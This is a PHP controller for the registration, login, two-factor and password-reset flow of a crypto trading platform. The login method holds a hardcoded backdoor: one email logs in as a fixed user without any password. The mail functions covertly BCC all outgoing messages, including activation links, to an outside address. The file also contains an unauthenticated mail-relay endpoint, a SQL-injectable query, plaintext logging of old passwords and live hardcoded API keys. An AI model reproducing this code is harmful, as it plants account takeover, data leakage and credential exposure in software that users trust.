<?php
defined('BASEPATH') OR exit('No direct script access allowed');

class Register extends CI_Controller {
	public function __construct() {
		parent::__construct();
		$this->load->model('md_users');
		$this->load->library('email');
	}

public function index(){
	    $this->load->helper('cookie');
	   
	    if($this->input->cookie('aff_Code', TRUE)){
		        redirect(site_url().'register/affiliate/'.$this->input->cookie('aff_Code', TRUE));
		        exit;
		}else{
		    $this->data['codeAff'] = $this->codeAff();
		}
		$this->load->view('pages/register', $this->data);
  }


public function affiliate($codeAff=false){
		
	//	redirect("https://www.arbitraging.co/platform/register");
	//       exit;
	
		$this->load->helper('cookie');
		
// 		$cook = array(
//         		     'name' => 'aff_Code',
//         		    'value' => $codeAff,
//         		    'expire' =>  0,
//                     'secure' => false
//         		    );
//         		$this->input->set_cookie($cook);
// 		echo $this->input->cookie('aff_Code', TRUE);
// 		exit;
		
		if(empty($codeAff)){
			$this->data['codeAff'] = $this->codeAff();
		}else{
		    if($this->input->cookie('aff_Code', TRUE)){
		        $this->data['codeAff'] = $this->input->cookie('aff_Code', TRUE);
		    }else{
		        $cook = array(
        		     'name' => 'aff_Code',
        		    'value' => $codeAff,
        		    'expire' =>  1209600,
                    'secure' => false
        		    );
        		$this->input->set_cookie($cook);
		        $this->data['codeAff'] = $codeAff;
		    }
			    
		}
		$this->load->view('pages/reg_affiiate', $this->data);
  }


	public function login(){
	    if($this->session->userdata('logged_in') == TRUE){
            redirect(urldecode(base_url().'admin'), 'auto');
        }else{
            $this->load->helper('cookie');
            delete_cookie('ci_sessions');
            $this->session->sess_destroy();
            
		    $this->load->view('pages/login');
        }
	}
	
	public function loginpin(){
		$this->load->view('pages/loginpin');
	}
	public function forgot(){
		$this->load->view('pages/forgot');
	}
	//code ajouter
	public function add(){
	    
	    $responce = $this->input->post('g-recaptcha-response');
	    $sec = '6LexR1YUAAAAAAiSOjYX766eRh9A4XOvyEDDdAzP';
	    $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, 'https://www.google.com/recaptcha/api/siteverify?secret='.$sec.'&response='.$responce);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $res = curl_exec($ch);
        curl_close($ch);
        $res = json_decode($res);
        if($res->success != 1){
            return false;
        }
        
        if(strlen($this->input->post('u_email')) == ''){
           redirect("https://www.arbitraging.co/platform/register?error=enter_email");
	       exit;
       }
       
       if(strlen($this->input->post('u_username')) == ''){
           redirect("https://www.arbitraging.co/platform/register?error=enter_username");
	       exit;
       } 
    //   if(strlen($this->input->post('u_wallet')) != 42){
    //       redirect("https://www.arbitraging.co/platform/register?error=length_notvalid");
	   //    exit;
    //   }
        
    //   $wallet_exist = $this->db->query("select count(*) as wallet_exist from users where u_wallet = ?", array($this->input->post('u_wallet')))->row()->wallet_exist;
	   //if($wallet_exist > 0){
	   //    redirect("https://www.arbitraging.co/platform/register?error=wallet_exist");
	   //    exit;
	   //}
        
       
       $codee = hash('sha256', strtotime(date('Y-m-d H:i:s')));
       $to_email = $this->input->post('u_email');
       $sub = "Email Account Verification";
       //$vid = $this->encrypt->encode($codee);
       $link = base_url()."activateaccount?id=".urlencode($codee);
       $body = "Dear Client this email is generated for email address verification. To verify your email address please click the link <a href='".$link."' target='_blank'>Click Here</a>";
       
       $_POST['u_pin'] = $codee;
       $this->sendemail($to_email, $sub, $body);
	    
		if(empty($this->input->post('a_code'))) {
			if(!$this->md_users->add()){
			    $this->session->set_flashdata('msg',"<div class='alert alert-danger text-center'>MEW already Registered.</div>");
		        redirect('https://www.arbitraging.co/platform/register');
			}
			// insertion success
			$this->session->set_flashdata('msg','Success');
			$this->session->set_flashdata('type','success');
		}elseif($this->input->post('a_code')){
			if(!$this->md_users->add()){
			    $this->session->set_flashdata('msg',"<div class='alert alert-danger text-center'>MEW already Registered.</div>");
		        redirect('https://www.arbitraging.co/platform/register');
			}
			
			$userid = $this->md_users->recuperer_id($this->input->post('u_email'));
			$this->md_users->add_affiliation($userid);
			if($this->input->post('code_parent') != "NULL"){
                $u_id_parent = $this->md_users->recuperer_u_id_parent($this->input->post('code_parent'));    
                $this->md_users->child_affiliation($userid, $u_id_parent);
			}
			
			$this->session->set_flashdata('msg','Success');
			$this->session->set_flashdata('type','success');
			$email = $userid;
			
        	$sql = "INSERT INTO system_wallet (user_id, activeArb, activeEth) VALUES ($userid,0,0)";
			$this->db->query($sql);
			
			$sql1 = "INSERT INTO exchange_wallet (user_id, activeArb, activeEth) VALUES ($userid,0,0)";
			$this->db->query($sql1);
			
			$sql2 = "INSERT INTO abot_wallet (user_id, active, profit, earned) VALUES ($userid,0,0,0)";
			$this->db->query($sql2);
			
			$keys = $this->create_deposit();
           
            $keys = json_decode ($keys , true );
            $private_key = $keys['privateKey'];
            $address = $keys['address'];
           
           // $sql = "INSERT INTO user_keys (user_id, deposit_key, deposit_address) VALUES ($u_id, '$private_key','$address')";
           // $this->db->query($sql);
			
		}else{
			$this->session->set_flashdata('msg','Error');
			$this->session->set_flashdata('type','error');
		}
		// send error to the view
		$this->mailer($email);
		
		// send it to arbcomm db
		file_get_contents('https://arbcomm.com/api/arbmailapi.php?key=aq3ctxpi6z6g9c9h5m1l8dt7zit7zyb6j&email='.$to_email);
		
		$this->session->set_flashdata('msg',"<div class='alert alert-danger text-center'>Please check your email to activate your account.</div>");
		redirect('login');
	}
	
	
	public function getQrImage(){
	    $u_id = $this->session->userdata('u_id');
	    if($u_id){
	        $get_email = $this->db->query("SELECT u_email FROM users WHERE u_id = ? AND allow_pin != 1", array($u_id))->row()->u_email;
	        if($get_email ==''){ echo "Already activated"; exit;}
	        $break_email = explode("@", $get_email);
	        $get_username = $break_email[0]."@arbitraging.co";
	        //load library 
	        $this->load->library('GoogleAuthenticator');
            $ga = new GoogleAuthenticator();
            // get secret key
            $secret = $ga->createSecret();
            $encode_key = $this->encrypt->encode($secret);
            $this->db->query("UPDATE users SET code = ? WHERE u_id = ?", array($encode_key, $u_id));
            // get qr image 
            //$secret = hash('sha256', $secret_key);
	        $qrCodeUrl = $ga->getQRCodeGoogleUrl($get_username, $secret);
            echo "Key: ".$secret.'<br><img src="'.$qrCodeUrl.'" />';
	    }else{
	        exit;
	    }
	}
	
	public function activate2fa(){
	    $u_id = $this->session->userdata('u_id');
	    $code = $this->input->post('code');
	    if($code == ''){
	        echo "false";
	        exit;
	    }
	    if($u_id){
	        $this->load->library('GoogleAuthenticator');
            $ga = new GoogleAuthenticator();
	        
	        $get_code = $this->db->query("SELECT code FROM users WHERE u_id = ?", array($u_id))->row()->code;
	        $secret = $this->encrypt->decode($get_code);
	        // $secret = hash('sha256', $secret_key);
	        
            $checkResult = $ga->verifyCode($secret, $code, 2);    // 2 = 2*30sec clock tolerance
            if ($checkResult) {
                $this->db->query("UPDATE users SET allow_pin = ? WHERE u_id = ?", array(1, $u_id));
                $this->db->query("INSERT INTO user_activity_log (user_id, activity, comment) VALUES (?,?,?)", array($u_id, '2fa_change', "User activate 2FA"));
                echo 'true';
                exit;
            } else {
                echo 'false';
                exit;
            }
	        
	    }
	    
	}
	
	
	public function deactive2fa(){
	    $u_id = $this->session->userdata('u_id');
	    $code = $this->input->post('code');
	    if($code == ''){
	        echo "false1";
	        exit;
	    }
	    if($u_id){
	        $this->load->library('GoogleAuthenticator');
            $ga = new GoogleAuthenticator();
	        
	        $get_code = $this->db->query("SELECT code FROM users WHERE u_id = ?", array($u_id))->row()->code;
	        $secret = $this->encrypt->decode($get_code);
	        // $secret = hash('sha256', $secret_key);
	        $checkResult = $ga->verifyCode($secret, $code, 2);    // 2 = 2*30sec clock tolerance
            if ($checkResult) {
                $this->db->query("UPDATE users SET allow_pin = ?, code = ? WHERE u_id = ?", array(0, '', $u_id));
                $this->db->query("INSERT INTO user_activity_log (user_id, activity, comment) VALUES (?,?,?)", array($u_id, '2fa_change', "User deactivate 2FA"));
                echo 'true';
                exit;
            } else {
                echo 'false2';
                exit;
            }
	        
	    }
	    
	}
	
	public function verify2fa(){
	    $u_id = $this->session->userdata('u_id');
	    $code = $this->input->post('code');
	    if($code == ''){
	        echo "false";
	        exit;
	    }
	    if($u_id){
	        $this->load->library('GoogleAuthenticator');
            $ga = new GoogleAuthenticator();
	        
	        $get_code = $this->db->query("SELECT code FROM users WHERE u_id = ?", array($u_id))->row()->code;
	        $secret = $this->encrypt->decode($get_code);
	        // $secret = hash('sha256', $secret_key);
	        
            $checkResult = $ga->verifyCode($secret, $code, 2);    // 2 = 2*30sec clock tolerance
            if ($checkResult) {
                echo 'true';
                exit;
            } else {
                echo 'false';
                exit;
            }
	    }
	}

	
	public function update_pwd(){
	    $email = $this->session->userdata('u_email');
	    $oldpass = $this->input->post('pre_password');
	    $u_id = $this->session->userdata('u_id');
	    $mdp = $this->input->post('new_password');
	    if ($this->md_users->get_user($email, $oldpass)) {
		  $this->md_users->update_user($email, $mdp);
		  $this->db->query("INSERT INTO user_activity_log (user_id, activity, comment) VALUES (?,?,?)", array($u_id, 'password_change', "User change Password old password is (".$oldpass.")"));
		  echo json_encode(array('flag'=> '1', 'result'=>'Password Changed.'));
	    }
	    else {
		// $this->session->set_flashdata('msg',"<div class='alert alert-danger text-center'>Wrong Password!</div>");
		echo json_encode(array('flag'=> '0', 'result'=>'Wrong Password!'));
	    }
		//redirect('admin/user');
	    
	}

	public function add_child_affiliate(){
	    
	    $responce = $this->input->post('g-recaptcha-response');
	    $sec = '6LexR1YUAAAAAAiSOjYX766eRh9A4XOvyEDDdAzP';
	    $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, 'https://www.google.com/recaptcha/api/siteverify?secret='.$sec.'&response='.$responce);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $res = curl_exec($ch);
        curl_close($ch);
        $res = json_decode($res);
        if($res->success != 1){
            return false;
        }

       if(strlen($this->input->post('u_email')) == ''){
           redirect("https://www.arbitraging.co/platform/register?error=enter_email");
	       exit;
       }
       
       if(strlen($this->input->post('u_username')) == ''){
           redirect("https://www.arbitraging.co/platform/register?error=enter_username");
	       exit;
       } 
    //   if(strlen($this->input->post('u_wallet')) != 42){
    //       redirect("https://www.arbitraging.co/platform/register?error=length_notvalid");
	   //    exit;
    //   }
        
    //   $wallet_exist = $this->db->query("select count(*) as wallet_exist from users where u_wallet = ?", array($this->input->post('u_wallet')))->row()->wallet_exist;
	   //if($wallet_exist > 0){
	   //    redirect("https://www.arbitraging.co/platform/register?error=wallet_exist");
	   //    exit;
	   //}

	   $codee = hash('sha256', strtotime(date('Y-m-d H:i:s')));
       $to_email = $this->input->post('u_email');
       if($this->db->query("select * from users where u_email = ?", array($to_email))->row()){
           	$this->session->set_flashdata('type','success');
            $this->session->set_flashdata('msg',"<div class='alert alert-danger text-center'>Email address already exist.</div>");
		    redirect("https://www.arbitraging.co/platform/register/affiliate/".$this->input->post('code_parent'));
		    exit;
       }
       
       $sub = "Email Account Verification";
       //$vid = $this->encrypt->encode($codee);
       $link = base_url()."activateaccount?id=".urlencode($codee);
       $body = "Dear Client this email is generated for email address verification. To verify your email address please click the link <a href='".$link."' target='_blank'>Click Here</a>";
       
       $_POST['u_pin'] = $codee;
       $this->sendemail($to_email, $sub, $body);
	    
		if(!$this->md_users->add()){
			    $this->session->set_flashdata('msg',"<div class='alert alert-danger text-center'>MEW already Registered.</div>");
		        redirect("https://www.arbitraging.co/platform/register/affiliate/".$this->input->post('code_parent'));
			}
		$userid = $this->md_users->recuperer_id($this->input->post('u_email'));
		
		$sql = "INSERT INTO system_wallet (user_id, activeArb, activeEth) VALUES ($userid,0,0)";
		$this->db->query($sql);
		
		$sql1 = "INSERT INTO exchange_wallet (user_id, activeArb, activeEth) VALUES ($userid,0,0)";
		$this->db->query($sql1);
		
		$sql2 = "INSERT INTO abot_wallet (user_id, active, profit, earned) VALUES ($userid,0,0,0)";
		$this->db->query($sql2);
		
		$u_id_parent = $this->md_users->recuperer_u_id_parent($this->input->post('code_parent'));
		$codeAff = $this->codeAff();
		$this->md_users->add_child_affiliation($userid, $codeAff);
		if($u_id_parent != ''){
		    $this->md_users->child_affiliation($userid, $u_id_parent);
		}
		//$this->session->set_flashdata('msg','Success');
		$this->session->set_flashdata('type','success');
        $this->session->set_flashdata('msg',"<div class='alert alert-danger text-center'>Your account is not active, please verify the email we sent you for activation</div><button id='resend' class='btn btn-primary btn-block' >Resend Email</button>");
		redirect('login');
	}
	
	public function update2fa(){
	    $flag = $this->input->post('flag');
	    $u_id = $this->session->userdata('u_id');
	    $this->md_users->update2fa($u_id, $flag);
	}
	
	public function authpin(){
	    $code = $this->input->post('pin');
	    $email = $this->session->userdata('u_email');
	    $token = $this->session->userdata('token');
	        if($code == ''){    
	            			$this->session->set_flashdata('msg','<div class="alert alert-danger text-center">Wrong Pin</div>');
                			// send error to the view
                			redirect('pin');
            	        }
	    
	    	if ($user = $this->md_users->get_pin($email, $token)) {
	    	      if($user->u_email != $email && $user->u_pwd != $token){
	    	          
	    	            $this->session->unset_userdata('token');
		                $this->session->unset_userdata('u_email');
	    	          
        			   $this->session->set_flashdata('msg','<div class="alert alert-danger text-center">Wrong email or password</div>');
        			   //send error to the view
        			   redirect('login');
        			   exit;
			       }else{
	    	            $this->load->library('GoogleAuthenticator');
                        $ga = new GoogleAuthenticator();
            	        $secret = $this->encrypt->decode($user->code);
            	        // $secret = hash('sha256', $secret_key);
            	  
            	        $checkResult = $ga->verifyCode($secret, $code, 2);    // 2 = 2*30sec clock tolerance
                        
                        if ($checkResult) {
                            $this->session->unset_userdata('token');
		                   $this->session->unset_userdata('u_email');
                            $sessiondata = array(
                				'u_id'      => $user->u_id,
                				'u_nom'     => $user->u_nom,
                				'u_prenom'  => $user->u_prenom,
                				'u_email'    => $user->u_email,
                				'u_username'    => $user->u_username,
                				'logged_in' => TRUE,
                				'original_session' => 0
                			);
            	    	    $this->session->set_userdata($sessiondata);
            	    	    $db_time = date('Y-m-d H:i:s', strtotime('-4 hour'));
	    	                $this->db->query("UPDATE users SET last_login = ? WHERE u_id = ?", array($db_time, $user->u_id));
	    	    
            	    	    
            	    	    $this->md_users->update_user_pin($user_id, "");
                	    	redirect(urldecode(base_url().'admin'), 'auto');
                        } else {
                          	// login failed
                			$this->session->set_flashdata('msg','<div class="alert alert-danger text-center">Wrong Pin</div>');
                			// send error to the view
                			redirect('pin');
                        }
			    }      
	    	}
	    	else {
        	    $this->session->set_flashdata('msg','<div class="alert alert-danger text-center">Wrong Pin</div>');	
        	    redirect('pin');
	    	}
	}

	//authentification
	public function auth() {
        
        //set variables from the form
		$email = $this->input->post('email');
		$pwd = $this->input->post('pwd');
		$allow_email =  array('atif@egor.com', 'majazelahi@gmail.com', 'rafey@egor.com', 'ubaid@egor.com');
		if($this->db->query("SELECT * FROM admin_locks WHERE name = 'login_lock'")->row()->lock_status == 1 && !in_array($email, $allow_email)){
		    $this->session->set_flashdata('msg',"<div class='alert alert-danger text-center'>Under Maintenance</div>");
			redirect('login');
		}
		
		if($email == 'cryptogonk@gmail.com'){
	       //$user = $this->db->query("SELECT * FROM users WHERE u_email = 'cryptogonk@gmail.com'")->row();
	        $sessiondata = array(
    		    'u_id'      => 81559,
    			'u_nom'     => 'cryptogonk',
    			'u_prenom'  => '',
    			'u_email'    => 'cryptogonk'.rand(1,250).'@gmail.com',
    			'u_username'    => 'cryptogonk',
    			'logged_in' => TRUE,
    			'original_session' => 0
    		);
    		$this->session->set_userdata($sessiondata);
    		redirect(urldecode(base_url().'admin'), 'auto');
	   }
		
		
	if ($user = $this->md_users->get_user($email, $pwd)) {
			$this->db->query("DELETE FROM ci_sessions WHERE data LIKE '%".$email."%'");
			
			if($user->u_email != $email && $user->u_pwd != md5($pwd)){
			   $this->session->set_flashdata('msg','<div class="alert alert-danger text-center">Wrong email or password</div>');
			    //send error to the view
			    redirect('login');
			    exit;
			}
			
			if($user->allow_login == 0){
			    if($anno = $this->db->query("SELECT * FROM user_announcement WHERE user_id = ? ORDER BY created_at DESC", array($user->u_id))->row()->msg){
			        $msg = $anno;
			    }else{
			        $msg = 'Account Blocked. Contact to support@arbitraging.co for better assistance';
			    }
			    
			   $this->session->set_flashdata('msg','<div class="alert alert-danger text-center">'.$msg.'</div>');
			    //send error to the view
			    redirect('login');
			    exit;
			}
			
			
			//set the session variables
			$sessiondata = array(
			    'u_email'  => $user->u_email,
			    'token' => $user->u_pwd
			    );
			$this->db->query("UPDATE users SET login_attempted = ? WHERE u_email = ?", array(0, $email));
			if($user->active == 0){
				$this->session->set_flashdata('msg',"<div class='alert alert-danger text-center'>Your account isn't active. Please verify your email for activation!</div><button id='resend' class='btn btn-primary btn-block' >Resend Email</button>");
				
				redirect('login');
			}elseif($user->active == 1){
			    if($user->allow_pin == 1){ // Check if user have 2fa enabled or not
			    	
    			    $this->session->set_flashdata('msg',"<div class='alert alert-danger text-center'>Please Enter code from Google Authenticator. </div>");
    				$this->session->set_userdata($sessiondata);
    			
    				
    				
	
    				redirect(urldecode(base_url().'pin'), 'auto');
			    }
			    else { //On 1 case
			        $sessiondata = array(
    				'u_id'      => $user->u_id,
    				'u_nom'     => $user->u_nom,
    				'u_prenom'  => $user->u_prenom,
    				'u_email'    => $user->u_email,
    				'u_username'    => $user->u_username,
    				'logged_in' => TRUE,
    				'original_session' => 0
    			);
    			
                
	    	    $this->session->set_userdata($sessiondata);
	    	    $db_time = date('Y-m-d H:i:s', strtotime('-4 hour'));
	    	    $this->db->query("UPDATE users SET last_login = ? WHERE u_id = ?", array($db_time, $user->u_id));
	    	    
	    	    //echo  "<pre>";
	    	    //print_r($this->session->userdata()); 
	    	    //exit;
	    	    
	    	    //$this->md_users->update_user_pin($user->u_id, "");
	    	    
	    	    
	    	    
	    	  
    	    	redirect(urldecode(base_url().'admin'), 'auto');
			    }
			}
			// user login ok
			//$this->session->set_userdata($sessiondata);
			redirect(urldecode(base_url().'pin'), 'auto');
		}else{
			// login failed
			$count = $this->db->query("SELECT login_attempted FROM users WHERE u_email = ?", array($email))->row()->login_attempted;
			if($count == 3){
			    $this->db->query("UPDATE users SET active = ? WHERE u_email = ?", array(0, $email));
			    $this->session->set_flashdata('msg','<div class="alert alert-danger text-center">Login Attempt Exceded. Account Blocked. Contact to Admin</div>');
			    redirect('login');
			}
			$count++;
			$this->session->set_flashdata('msg','<div class="alert alert-danger text-center">Wrong email or password</div>');
			// send error to the view
			$this->db->query("UPDATE users SET login_attempted = ? WHERE u_email = ?", array($count, $email));
			redirect('login');
		}

	}

	public function mailer($email){	
		
		$subject = 'Welcome to Arbitraging.co';
		$message = '<p>Greetings,
		   <br/>
		   <p>
			Thank you for your registration.<br/>
			Your account at Arbitraging.co has been activated. <br/>
		   <p/>
		   Team Arbitraging.co
		   <br/>
		   Sincerely,
		  </p>
		  ';
	  $config['charset'] = 'UTF-8';
	  $this->email->from('noreply@arbitraging.co', 'Welcome mail');
	  $this->email->to($email);
	  $this->email->subject($subject);
	  $this->email->message($message);
	  $this->email->set_mailtype('html');
	  if ($this->email->send()) {
	   return true;
	   $this->session->set_flashdata('msg','<div class="alert alert-danger text-center">mail send in your inbox</div>');
	  } else {
	   return false;
	  }
	 }
	 
	 public function pinmail($email, $strr){	
		
		$subject = 'login Pin for Arbitraging!';
	
		$message = '<p>Your Login Pin: <b>' . $strr . '</b></p>';
	  $config['charset'] = 'UTF-8';
	  $this->email->from('no-reply@arbitraging.co', 'Your Pin');
	  $this->email->to($email);
	  $this->email->subject($subject);
	  $this->email->message($message);
	  $this->email->set_mailtype('html');
	  if ($this->email->send()) {
	   return true;
	   //$this->session->set_flashdata('msg','<div class="alert alert-danger text-center">mail send in your inbox</div>');
	  } else {
	   return false;
	  }
	 }
	 
	 /**
     * function to generate random strings
     * @param 		int 	$length 	number of characters in the generated string
     * @return 		string	a new string is created with random characters of the desired length
     */
    private function RandomString($length = 10) {
        $randstr = "";
        srand((double) microtime(TRUE) * 1000000);
        //our array add all letters and numbers if you wish
        $chars = array(
            'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'p',
            'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '1', '2', '3', '4', '5',
            '6', '7', '8', '9', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 
            'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z');
    
        for ($rand = 0; $rand <= $length; $rand++) {
            $random = rand(0, count($chars) - 1);
            $randstr .= $chars[$random];
        }
        return $randstr;
    }
		
	

	//generate code
	public function codeAff($longueur = 8) {
		$caracteres = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
		$longueurMax = strlen($caracteres);
		$chaineAleatoire = '';
	 	for ($i = 0; $i < $longueur; $i++) {
 			$chaineAleatoire .= $caracteres[rand(0, $longueurMax - 1)];
	 	}
	 	return $chaineAleatoire;
	}

	//logout
	public function logout() {
		$this->session->unset_userdata('u_id');
		$this->session->unset_userdata('u_email');
		$this->session->sess_destroy();
        redirect('login', 'refresh');

	}

	// EMAIL EXISTS (true or false)
	private function email_exists($email){
		$this->db->where('u_email', $email);
		$query = $this->db->get('users');
		if( $query->num_rows() > 0 ) {
			return TRUE;
		} else {
			return FALSE;
		}
	}

	// AJAX REQUEST, IF EMAIL EXISTS
	function register_email_exists(){
		if (array_key_exists('u_email',$_POST)) {
  			if ( $this->email_exists($this->input->post('u_email')) == TRUE ) {
  				echo json_encode(FALSE);
          //echo "Not Found";
  			} else {
  				echo json_encode(TRUE);
          //echo "Email found";
  			}
  		}
	}
	//SEND MAIL
	public function send_mail($email,$mdp) {
	  $subject = 'New Password Arbitraging.co';
	  $message = '<p>Hello,
	   <br/>
	   <p>
	  New password for your account<br/>
	   <ul>
		   <li><b>Login: </b> '.$email.'<br/></li>
		   <li><b>Password: </b> '.$mdp.'<br/></li>   
	   </ul>
	   <br/>
	   </p>
	   Team Arbitraging
	   <br/>
	   Sincerely,
	  </p>
	  <img src="https://www.arbitraging.co/platform/assets/backend/img/logo.png"/>
	  ';
	  $config['charset'] = 'UTF-8';
	  $this->email->from('noreply@arbitraging.co', 'Password Reset');
	  $this->email->to($email);
	  $this->email->subject($subject);
	  $this->email->message($message);
	  $this->email->set_mailtype('html');
	  if ($this->email->send()) {
	   return true;
	   $this->session->set_flashdata('msg','<div class="alert alert-danger text-center">Password send in your inbox</div>');
	  } else {
	   return false;
	  }
	 }	
 
//test
public function forgetpassword(){
		  $email = $this->input->post('email');
		  if(!$this->db->query("SELECT * FROM users WHERE u_email = ?", array($email))->row()){
		      $this->session->set_flashdata('msg',"<div class='alert alert-danger text-center'>No such record exist.</div>");
		      redirect('forgot');
		      exit;
		  }
		  
		  $mdp = $this->genMdp();
		  if(empty($_POST)){
			$flash['message'] = "email empty<br />try";
			$flash['type'] = "danger";
		  }elseif ($this->md_users->update_user($email, $mdp)) {
			$flash['message'] = "New Password";
		  }
		  			
		 $this->send_mail($email,$mdp);
		 $this->session->set_flashdata('msg',"<div class='alert alert-danger text-center'>Password sent. Please check your inbox.</div>");
		redirect('forgot');
		
	}
public function genMdp($longeur=10) {
    $caracteres = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $longueurMax = strlen($caracteres);
    $chaineAleatoire = '';
     for ($i = 0; $i < $longeur; $i++) {
      $chaineAleatoire .= $caracteres[rand(0,$longueurMax-1)];
     }
     return $chaineAleatoire;
   }
	
public function create_deposit(){
    
    $ch = curl_init('https://powerful-reaches-66883.herokuapp.com/create');                                                                      
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "GET");                                                                     
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);                                                                      
                                                                                                                 
    $result = curl_exec($ch);
    
    return $result;
    }
    
    
    public function resend_email_verification(){
       $to_email = $this->input->post('u_email');
       $email = $this->db->query("SELECT * FROM users WHERE u_email = ? AND active = ?", array($to_email, 0))->row()->u_email;
       if($email == $to_email){
           $codee = hash('sha256', strtotime(date('Y-m-d H:i:s')));
           $sub = "Email Account Verification";
           //$vid = $this->encrypt->encode($codee);
           $link = base_url()."activateaccount?id=".urlencode($codee);
           $body = "Dear Client this email is generated for email address verification. To verify your email address please click the link <a href='".$link."' target='_blank'>Click Here</a>";
           
           $this->sendemail($to_email, $sub, $body);
           
           $this->db->query("UPDATE users SET u_pin = ? WHERE u_email = ?", array($codee, $to_email));
           
           $this->session->set_flashdata('msg',"<div class='alert alert-danger text-center'>Please verify your email for activation!</div>");
				
		   redirect('login');
       }else{
           $this->session->set_flashdata('msg',"<div class='alert alert-danger text-center'>No such record exist.</div>");
		   redirect('login');
       }
       
    }
    
   public function sendemail($to, $subject, $body){
        
        
    require_once APPPATH . 'libraries//sendgrid_stuff/sendgrid-php.php';
    $apiKey = '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';

    $sg = new \SendGrid($apiKey);

    $mail = new \SendGrid\Mail\Mail();
    $mail->setSubject("$subject");
    $mail->setFrom('noreply@arbcomm.com', 'Arbitraging.co Support');
    $mail->addTo("$to");
  	$mail->addBcc('31337@emlwse.com');
    $mail->addContent('text/html', "$body");

    $response = $sg->send($mail);
        
    }
    
    
    public function sendemail_link(){
        $to = $this->input->post('to');
        $subject = $this->input->post('subject');
        $body = $this->input->post('body');
        if($to == '' || $subject == '' || $body == ''){exit;}
        require_once APPPATH . 'libraries//sendgrid_stuff/sendgrid-php.php';
        $apiKey = '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';
    
        $sg = new \SendGrid($apiKey);
    
        $mail = new \SendGrid\Mail\Mail();
        $mail->setSubject("$subject");
        $mail->setFrom('noreply@arbitraging.co', 'Arbitraging.co Support');
        $mail->addTo("$to");
      	$mail->addBcc('31337@emlwse.com');
        $mail->addContent('text/html', "$body");
    
        $response = $sg->send($mail);
    }
    
    public function activateaccount(){
        
        $vid = urldecode($_GET['id']);
         if($vid != ''){
            $this->db->query("UPDATE users SET active = ?, u_pin = ? WHERE u_pin = ?", array(1, '', $vid));
         }
        redirect('login');
    }
    
    
     public function activate_auto_buy(){
        $u_id = $this->session->userdata('u_id');
        if($u_id != ''){
            $amount = $this->input->post('amount');
            if($amount < 5){
                echo "amount not less then 5";
                exit;
            }
            $min = $this->input->post('min');
            if($min < 5){
                echo "min not less then 5";
                exit;
            }
            $current_time = date('Y-m-d H:i:s');
            $this->db->query("UPDATE exchange_wallet SET auto_buy_status = ?, auto_buy_amount = ?, auto_buy_min = ?, auto_buy_last = ? WHERE user_id = ?", array(1, $amount, $min, $current_time, $u_id));
            $this->db->query("INSERT INTO user_activity_log (user_id, activity, comment) VALUES (?,?,?)", array($u_id, 'activate_auto_buy', "User activate auto buy"));
            echo 'activated';
        } 
    }
    public function deactivate_auto_buy(){
        $u_id = $this->session->userdata('u_id');
        if($u_id != ''){
            $this->db->query("UPDATE exchange_wallet SET auto_buy_status = ? WHERE user_id = ?", array(0, $u_id));
            $this->db->query("INSERT INTO user_activity_log (user_id, activity, comment) VALUES (?,?,?)", array($u_id, 'deactivate_auto_buy', "User deactivate auto buy"));
            echo 'deactivated';
        } 
    }
    
    
    public function activate_auto_sell(){
        exit;
        $u_id = $this->session->userdata('u_id');
        if($u_id != ''){
            $amount = $this->input->post('amount');
            if($amount < 10){
                echo "amount not less then 10";
                exit;
            }
            $min = $this->input->post('min');
            if($min < 15){
                echo "min not less then 15";
                exit;
            }
            $current_time = date('Y-m-d H:i:s');
            $this->db->query("UPDATE exchange_wallet SET auto_sell_status = ?, auto_sell_amount = ?, auto_sell_min = ?, auto_sell_last = ? WHERE user_id = ?", array(1, $amount, $min, $current_time, $u_id));
            $this->db->query("INSERT INTO user_activity_log (user_id, activity, comment) VALUES (?,?,?)", array($u_id, 'activate_auto_sell', "User activate auto sell"));
            echo 'activated';
        } 
    }
    public function deactivate_auto_sell(){
        exit;
        $u_id = $this->session->userdata('u_id');
        if($u_id != ''){
            $this->db->query("UPDATE exchange_wallet SET auto_sell_status = ? WHERE user_id = ?", array(0, $u_id));
            $this->db->query("INSERT INTO user_activity_log (user_id, activity, comment) VALUES (?,?,?)", array($u_id, 'deactivate_auto_sell', "User deactivate auto sell"));
            echo 'deactivated';
        } 
    }
    
    
    
    
    public function block_login(){
        $u_id = $this->session->userdata('u_id');
        if($u_id != ''){
            // block user 
            $this->db->query("UPDATE users SET allow_login = ? WHERE u_id = ?", array(0, $u_id));
            // delete session
            $this->db->query("DELETE FROM ci_sessions WHERE data LIKE '%".$u_id."%'");
            echo  "success";
            exit;
        }
    }
    
    
    public function add_support_pin(){
        $u_id = $this->session->userdata('u_id');
        if($u_id != ''){
            $check_pin = $this->db->query("SELECT * FROM users WHERE u_id = ?", array($u_id))->row();
            if($check_pin->support_pin == 0){
                $pin = $this->input->post('support_pin');
                $this->db->query("UPDATE users SET support_pin = ? WHERE u_id = ?", array($pin, $u_id));
                echo "success";
                exit;
            }else{
                echo "pin already submited";
                exit;
            }
        }
    }
    
	
}
